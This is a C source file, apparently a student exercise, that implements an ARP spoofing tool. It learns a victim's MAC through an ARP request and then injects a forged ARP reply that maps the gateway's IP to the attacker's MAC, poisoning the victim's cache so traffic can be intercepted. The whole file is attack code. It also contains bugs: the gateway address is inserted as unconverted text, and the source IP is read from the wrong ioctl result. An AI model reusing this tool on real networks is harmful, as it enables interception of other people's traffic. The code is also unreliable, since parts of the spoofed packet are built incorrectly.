#include <stdio.h>
#include <string.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <unistd.h>
#include <pcap.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <net/ethernet.h>
#include <netinet/if_ether.h>
 
unsigned char *mac;
unsigned char *dst_mac;
char ip[20];
char gateway_ip[20];
int flag;

int arp_request(char *target_ip, pcap_t *pd); 
void callback(unsigned char *useless, const struct pcap_pkthdr *pkthdr, const unsigned char *packet);
int arp_reply(char *target_ip, pcap_t *pd); 

int main(int argc, char **argv)
{
    int fd;
    struct ifreq ifr;
    struct sockaddr_in *sin;
    char *device;
    char target_ip[4];
    char err_buf[PCAP_ERRBUF_SIZE];
    char cmd[256] = {0, };
    pcap_t *pd;
    FILE *fp;
 
    if(argc != 2)
    {
        printf("%s <Target IP address>\n", argv[0]);
        return 1;
    }
    
    inet_pton(AF_INET, argv[1], target_ip);
    
    device = pcap_lookupdev(err_buf);
	if(device == NULL)
	{
		printf("pcap_lookupdev error: %s\n", err_buf);
		return 1;
	}
 
    memset(&ifr, 0x00, sizeof(ifr));
    strcpy(ifr.ifr_name, device);
  
    if((fd=socket(AF_INET, SOCK_DGRAM, 0))<0)
    {
        perror("socket");
        return 1;
    }
 
    if(ioctl(fd, SIOCGIFHWADDR, &ifr)<0)
    {
        perror("ioctl");
        return 1;
    }
 
	sin = (struct sockaddr_in*)&ifr.ifr_addr;
	
	inet_ntop(AF_INET, &sin->sin_addr.s_addr, ip, sizeof(ip));
	
    mac = ifr.ifr_hwaddr.sa_data;
    
    printf("Src IP: %s\n", ip); 
    printf("Src mac: %02x:%02x:%02x:%02x:%02x:%02x\n", mac[0],mac[1],mac[2],mac[3],mac[4],mac[5]);
 
    close(fd);
   
	pd = pcap_open_live(device, BUFSIZ, 0, -1, err_buf);	
    
    arp_request(target_ip, pd);   
     
    pcap_loop(pd, 3, callback, NULL);
    
    printf("Dst mac: %02x:%02x:%02x:%02x:%02x:%02x\n", dst_mac[0], dst_mac[1], dst_mac[2], dst_mac[3], dst_mac[4], dst_mac[5]);   
    
    //get gateway address
    sprintf(cmd, "route | grep default | awk '{print $2}'");
    fp = popen(cmd, "r");
    fgets(gateway_ip, sizeof(gateway_ip), fp);
    printf("Gateway IP: %s", gateway_ip);
    
    arp_reply(target_ip, pd);    
    
    return 0;
}

int arp_request(char *target_ip, pcap_t *pd)
{
	unsigned char arp_pkt[42] = {0,};
	char my_ip[4];
	int i;
	
	inet_pton(AF_INET, ip, my_ip);
	
	//ethernet hdr
	for(i=0;i<6;i++)
	{
		arp_pkt[i] = 0xff; //broadcast
		arp_pkt[6+i] = mac[i]; //src_mac
	}	
	arp_pkt[12] = 0x08; arp_pkt[13] = 0x06; //ethertype: arp		
	
	//arp header
	arp_pkt[14] = 0x00; arp_pkt[15] = 0x01; //hardware type: ethernet
	arp_pkt[16] = 0x08;	arp_pkt[17] = 0x00;//protocol type: IPv4
	arp_pkt[18] = 0x06; //hardware size
	arp_pkt[19] = 0x04; //protocol size
	arp_pkt[20] = 0x00; arp_pkt[21] = 0x01; //Opcode
	
	for(i=0;i<6;i++)
	{
		arp_pkt[22+i] = mac[i]; //src_mac
	}
	
	for(i=0;i<4;i++)
	{
		arp_pkt[28+i] = my_ip[i]; //src_ip
	}
	
	for(i=0;i<6;i++)
	{
		arp_pkt[32+i] = 0x00; //anonymous
	}
	
	for(i=0;i<4;i++)
	{
		arp_pkt[38+i] = target_ip[i]; //dst_ip
	}	
	
	if(pcap_inject(pd, arp_pkt, sizeof(arp_pkt))==-1) 
	{
        pcap_perror(pd, 0);
        pcap_close(pd);
        exit(1);
	}
	
	return 0;
}
	
//get arp packet from victim
void callback(unsigned char *useless, const struct pcap_pkthdr *pkthdr, const unsigned char *packet)
{	
	if(flag == 1)
	{
		return;
	}
	
	struct ether_header *ep;
	unsigned short ether_type;
	
	
	ep = (struct ether_header *)packet;
	ether_type = ntohs(ep->ether_type);
	flag = 0;
	
	if(ether_type == 0x0806)
	{
		//printf("Dst MAC: ");	
		//printf("%02x:%02x:%02x:%02x:%02x:%02x\n", ep->ether_shost[0], ep->ether_shost[1], ep->ether_shost[2], ep->ether_shost[3], ep->ether_shost[4], ep->ether_shost[5]);
		dst_mac = ep->ether_shost;	
		flag = 1;
	}			
}

int arp_reply(char *target_ip, pcap_t *pd)
{
	unsigned char arp_pkt[42] = {0,};
	char my_ip[4];
	int i;
	
	inet_pton(AF_INET, ip, my_ip);
	
	//ethernet hdr
	for(i=0;i<6;i++)
	{
		arp_pkt[i] = dst_mac[i]; //dst_mac
		arp_pkt[6+i] = mac[i]; //src_mac
	}	
	arp_pkt[12] = 0x08; arp_pkt[13] = 0x06; //ethertype: arp		
	
	//arp header
	arp_pkt[14] = 0x00; arp_pkt[15] = 0x01; //hardware type: ethernet
	arp_pkt[16] = 0x08;	arp_pkt[17] = 0x00;//protocol type: IPv4
	arp_pkt[18] = 0x06; //hardware size
	arp_pkt[19] = 0x04; //protocol size
	arp_pkt[20] = 0x00; arp_pkt[21] = 0x02; //Opcode
	
	for(i=0;i<6;i++)
	{
		arp_pkt[22+i] = mac[i]; //src_mac
	}
	
	for(i=0;i<4;i++)
	{
		arp_pkt[28+i] = gateway_ip[i]; //gateway_ip
	}
	
	for(i=0;i<6;i++)
	{
		arp_pkt[32+i] = dst_mac[i]; //dst_mac
	}
	
	for(i=0;i<4;i++)
	{
		arp_pkt[38+i] = target_ip[i]; //dst_ip
	}	
	
	if(pcap_inject(pd, arp_pkt, sizeof(arp_pkt))==-1) 
	{
        pcap_perror(pd, 0);
        pcap_close(pd);
        exit(1);
	}
	
	return 0;
}
	
	
	
	

